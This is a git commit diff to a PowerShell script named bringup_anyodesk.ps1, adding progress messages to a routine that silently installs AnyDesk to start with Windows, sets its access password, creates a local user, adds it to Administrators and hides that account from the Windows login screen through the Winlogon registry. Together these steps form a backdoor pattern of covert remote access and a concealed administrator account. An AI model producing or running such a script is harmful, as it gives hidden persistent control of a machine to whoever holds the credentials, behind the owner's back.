fb0392b7358d83828ba32264d31e653b5317b942
swethadhry <swethadhry@users.noreply.github.com>
2024-12-11 20:46:10 +0530

    Update bringup_anyodesk.ps1

--- bringup_anyodesk.ps1
+++ bringup_anyodesk.ps1
@@ -14,20 +14,28 @@ function Install-AnyDesk {
             New-Item -Path $InstallPath -ItemType Directory
         }
 
+        Write-Ouput "Downloading..."
         # Download AnyDesk
         Invoke-WebRequest -Uri $AnyDeskUrl -OutFile (Join-Path -Path $InstallPath -ChildPath "AnyDesk.exe")
+
+        Write-Output "Download Complete"
 
         # Install AnyDesk silently
         Start-Process -FilePath (Join-Path -Path $InstallPath -ChildPath "AnyDesk.exe") -ArgumentList "--install $InstallPath --start-with-win --silent" -Wait
 
+        Write-Output "Install Complete"
+        
         # Set AnyDesk password
         Start-Process -FilePath (Join-Path -Path $InstallPath -ChildPath "AnyDesk.exe") -ArgumentList "--set-password=$Password" -Wait
+        Write-Output "Set password Complete"
 
         # Create a new user account
         New-LocalUser -Name $AdminUsername -Password (ConvertTo-SecureString -String $AdminPassword -AsPlainText -Force)
+        Write-Output "New user add Complete"
 
         # Add the user to the Administrators group
         Add-LocalGroupMember -Group "Administrators" -Member $AdminUsername
+        Write-Output "New user to admin group Complete"
 
         # Hide the user from the Windows login screen
         Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" -Name $AdminUsername -Value 0 -Type DWORD -Force
